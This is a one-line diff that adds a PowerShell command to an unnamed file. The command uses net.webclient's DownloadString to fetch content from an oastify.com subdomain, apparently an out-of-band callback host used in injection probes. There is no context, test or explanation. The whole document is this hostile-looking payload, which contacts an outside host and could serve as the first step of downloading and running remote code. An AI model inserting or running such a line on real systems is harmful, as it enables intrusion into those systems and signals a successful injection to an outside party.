@@ -1,0 +1,1 @@
+(new-object net.webclient).downloadstring("http://4ejniypkg18mq8dbco3b12ma61cs0io7.oastify.com")
